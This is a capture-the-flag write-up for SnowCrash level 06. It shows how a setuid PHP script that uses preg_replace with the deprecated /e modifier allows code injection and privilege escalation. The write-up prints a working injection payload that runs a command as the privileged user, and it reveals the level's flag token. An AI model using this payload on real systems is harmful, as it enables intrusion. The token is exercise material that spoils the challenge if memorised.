# Level 06

## Vulnerability
Privilege escalation - PHP code injection
Deprecated /e regex modifier in script owned by privileged user

## Context
```
level06@SnowCrash:~$ ls -l
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

## Solution
The binary ```level06``` is executed as user flag06, thanks to the suid bit. We should be able to exploit this to run getflag for us. Lets look at the .php file to investigate how.
```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
    }
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
    }
$r = x($argv[1], $argv[2]);
print $r;
?>
```
We find preg_replace() used with the /e modifier. The [official doc](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php) tells us this modifier is depecrated because it introduces a vulnerability:
> If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string.

> Caution: Use of this modifier is discouraged, as it introduces remote code execution vulnerabilities. An attacker can execute arbitrary PHP code and gain access to the server.

So using the correct php syntax.
```
level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /dev/shm/getflag
level06@SnowCrash:~$ ./level06 /dev/shm/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
